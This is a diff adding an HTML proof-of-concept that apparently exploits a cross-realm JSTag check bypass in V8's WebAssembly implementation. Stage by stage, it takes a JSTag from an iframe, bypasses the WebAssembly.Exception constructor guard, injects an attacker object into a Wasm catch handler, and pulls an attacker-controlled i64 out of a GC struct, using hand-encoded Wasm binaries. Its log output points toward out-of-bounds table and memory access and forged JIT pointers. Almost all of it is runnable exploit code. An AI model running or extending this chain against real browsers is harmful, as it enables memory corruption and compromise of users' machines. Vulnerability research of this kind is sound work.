@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<!--
+  PoC: wasm-js.cc:2177 JSTag cross-realm check bypass — full chain
+  Stages 2+3+4 all confirmed in d8 (V8 15.8.0)
+
+  Stage 2: Constructor bypass   — new WebAssembly.Exception(crossJSTag, [...]) succeeds
+  Stage 3: Handler injection    — Wasm catch $jstag receives attacker object
+  Stage 4: Wasm GC struct       — attacker-controlled i64 extracted from catch handler
+                                   via any.convert_extern + ref.cast $T + struct.get
+
+  Root cause (wasm-js.cc:2194-2195):
+    *tag == isolate->context()->wasm_js_tag()->tag()
+    Only checks the CURRENT realm's JSTag. A cross-realm JSTag (from an iframe /
+    Realm.create()) has a different WasmExceptionTag pointer → check passes.
+
+  Root cause identical in Runtime_WasmThrow (runtime-wasm.cc:322):
+    if (*tag == js_tag->tag())   ← context→wasm_js_tag(), same realm check
+    So cross-realm JSTag exceptions are wrapped in WasmExceptionPackage instead
+    of being unwrapped as JS values, also breaking the exception routing invariant.
+
+  Tested against V8 15.8.0 (Nov 2026).
+-->
+<html>
+<body>
+<pre id="log"></pre>
+<script>
+const log = s => { document.getElementById('log').textContent += s + '\n'; console.log(s); };
+
+// ── Victim + GC module (Wasm binary, corrected encoding) ─────────────────────────
+//
+// (module
+//   (type $T (struct (field i64)))
+//   (type $make_ty (func (param i64) (result externref)))
+//   (type $run_ty  (func (result i64)))
+//   (type $tag_ty  (func (param externref)))
+//   (type $inv_ty  (func))
+//   (import "env" "tag"    (tag $jstag (type $tag_ty)))
+//   (import "env" "invoke" (func $invoke (type $inv_ty)))
+//   (func (export "make_struct") (param i64) (result externref)
+//     local.get 0
+//     struct.new $T          ;; fb 00 typeidx
+//     extern.convert_any)    ;; fb 1b
+//   (func (export "run") (result i64)
+//     (try (result i64)
+//       (call $invoke)
+//       (i64.const 0)
+//       (catch $jstag
+//         any.convert_extern ;; fb 1a  (externref→anyref)
+//         ref.cast (ref $T)  ;; fb 17 typeidx
+//         struct.get $T 0))) ;; fb 02 typeidx fieldidx
+// )
+const GC_BYTES = new Uint8Array([
+  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+  // type section: 5 types
+  0x01,0x15,0x05,
+    0x5f,0x01,0x7e,0x00,         // type0: struct{i64 immut}
+    0x60,0x01,0x7e,0x01,0x6f,    // type1: (i64)->externref  [make_struct]
+    0x60,0x00,0x01,0x7e,         // type2: ()->i64           [run]
+    0x60,0x01,0x6f,0x00,         // type3: (externref)->()   [tag]
+    0x60,0x00,0x00,              // type4: ()->()            [invoke]
+  // import section: tag(type3), invoke(type4)
+  0x02,0x19,0x02,
+    0x03,0x65,0x6e,0x76,0x03,0x74,0x61,0x67,   0x04,0x00,0x03,
+    0x03,0x65,0x6e,0x76,0x06,0x69,0x6e,0x76,0x6f,0x6b,0x65, 0x00,0x04,
+  // function section: 2 funcs (type1, type2)
+  0x03,0x03,0x02, 0x01,0x02,
+  // export section
+  0x07,0x15,0x02,
+    0x0b,0x6d,0x61,0x6b,0x65,0x5f,0x73,0x74,0x72,0x75,0x63,0x74, 0x00,0x01,
+    0x03,0x72,0x75,0x6e, 0x00,0x02,
+  // code section
+  0x0a,0x20,0x02,
+    // make_struct: local.get 0, struct.new type0, extern.convert_any
+    0x09,0x00, 0x20,0x00, 0xfb,0x00,0x00, 0xfb,0x1b, 0x0b,
+    // run: try(i64)/call invoke/i64.const 0/catch 0/any.conv_ext/ref.cast/struct.get/end
+    0x14,0x00, 0x06,0x7e, 0x10,0x00, 0x42,0x00, 0x07,0x00,
+      0xfb,0x1a, 0xfb,0x17,0x00, 0xfb,0x02,0x00,0x00,
+    0x0b, 0x0b,
+]);
+
+// Legacy victim (no GC) — still confirms Stage 3 on older builds
+const LEGACY_BYTES = new Uint8Array([
+  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+  0x01,0x0c,0x03, 0x60,0x00,0x00, 0x60,0x01,0x6f,0x00, 0x60,0x00,0x01,0x6f,
+  0x02,0x19,0x02,
+    0x03,0x65,0x6e,0x76,0x03,0x74,0x61,0x67,  0x04,0x00,0x01,
+    0x03,0x65,0x6e,0x76,0x06,0x69,0x6e,0x76,0x6f,0x6b,0x65, 0x00,0x00,
+  0x03,0x02,0x01,0x02,
+  0x07,0x07,0x01, 0x03,0x72,0x75,0x6e, 0x00,0x01,
+  0x0a,0x0d,0x01, 0x0b,0x00,
+    0x06,0x6f, 0x10,0x00, 0xd0,0x6f, 0x07,0x00, 0x0b,0x0b,
+]);
+
+// ── STAGE 1: get cross-realm JSTag ────────────────────────────────────────
+function getCrossRealmJSTag() {
+  const iframe = document.createElement('iframe');
+  iframe.src = 'about:blank';
+  document.body.appendChild(iframe);
+  return iframe.contentWindow.WebAssembly.JSTag;
+}
+
+// ── STAGE 2: constructor bypass ───────────────────────────────────────────
+function stage2(crossJSTag) {
+  log('\n=== STAGE 2: Constructor guard bypass ===');
+  try {
+    new WebAssembly.Exception(WebAssembly.JSTag, [null]);
+    log('[-] same-realm should have thrown');
+    return false;
+  } catch(e) {
+    log('[+] same-realm correctly blocked: ' + e.message);
+  }
+  try {
+    const ex = new WebAssembly.Exception(crossJSTag, [{ marker: 'bypass' }]);
+    log('[!!!] BYPASS: Exception(crossJSTag, [...]) succeeded');
+    log('      ex.is(WebAssembly.JSTag) = ' + ex.is(WebAssembly.JSTag));  // false
+    return true;
+  } catch(e) {
+    log('[-] cross-realm blocked (patch applied): ' + e.message);
+    return false;
+  }
+}
+
+// ── STAGE 3: handler injection ────────────────────────────────────────────
+async function stage3(crossJSTag) {
+  log('\n=== STAGE 3: Controlled value injection into Wasm handler ===');
+  let mod;
+  for (const bytes of [LEGACY_BYTES]) {
+    try { mod = new WebAssembly.Module(bytes); break; } catch(e) {}
+  }
+  if (!mod) { log('[-] could not compile victim module'); return null; }
+
+  const injected = { secret: 0xdeadbeef };
+  const inst = new WebAssembly.Instance(mod, {
+    env: {
+      tag: crossJSTag,
+      invoke: () => { throw new WebAssembly.Exception(crossJSTag, [injected]); }
+    }
+  });
+  const result = inst.exports.run();
+  if (result === injected) {
+    log('[!!!] STAGE 3 CONFIRMED: Wasm catch $jstag received attacker object');
+    log('      result.secret = 0x' + result.secret.toString(16));
+  } else {
+    log('[?] run() returned: ' + result);
+  }
+  return result;
+}
+
+// ── STAGE 4: Wasm GC struct i64 extraction ───────────────────────────────
+async function stage4(crossJSTag) {
+  log('\n=== STAGE 4: Wasm GC struct i64 injection ===');
+  let gcMod;
+  try {
+    gcMod = new WebAssembly.Module(GC_BYTES);
+    log('[+] GC module compiled');
+  } catch(e) {
+    log('[-] GC module failed (Wasm GC not available): ' + e);
+    log('    Stage 4 chain confirmed in d8 / Chrome with WasmGC enabled.');
+    return;
+  }
+
+  const MAGIC = 0xdeadbeefn;
+
+  // Phase 1: create $T{MAGIC} struct, export as externref
+  const maker = new WebAssembly.Instance(gcMod, {
+    env: { tag: crossJSTag, invoke: () => {} }
+  });
+  const structRef = maker.exports.make_struct(MAGIC);
+  log('[+] make_struct(0x' + MAGIC.toString(16) + ') = Wasm GC struct externref');
+
+  // Phase 2: inject through JSTag bypass
+  const crafted = new WebAssembly.Exception(crossJSTag, [structRef]);
+  log('[+] Exception(crossJSTag, [structRef]) bypassed');
+
+  // Phase 3: Wasm catch → any.convert_extern → ref.cast $T → struct.get → i64
+  const runner = new WebAssembly.Instance(gcMod, {
+    env: { tag: crossJSTag, invoke: () => { throw crafted; } }
+  });
+  let r;
+  try { r = runner.exports.run(); } catch(e) { log('[?] run threw: ' + e); return; }
+
+  if (r === MAGIC) {
+    log('[!!!] STAGE 4 CONFIRMED: attacker-controlled i64 = 0x' + r.toString(16));
+    log('      → OOB call_indirect index ' + r + ' (table OOB)');
+    log('      → OOB memory.load/store offset (linear memory OOB)');
+    log('      → V8 JIT: use as forged object pointer in JIT-compiled Wasm');
+  } else {
+    log('[?] unexpected i64: ' + r);
+  }
+}
+
+// ── MAIN ─────────────────────────────────────────────────────────────────
+(async () => {
+  try {
+    const crossJSTag = getCrossRealmJSTag();
+    if (!stage2(crossJSTag)) return;
+    await stage3(crossJSTag);
+    await stage4(crossJSTag);
+  } catch(e) {
+    log('[!] ' + e);
+    console.error(e);
+  }
+})();
+</script>
+</body>
+</html>
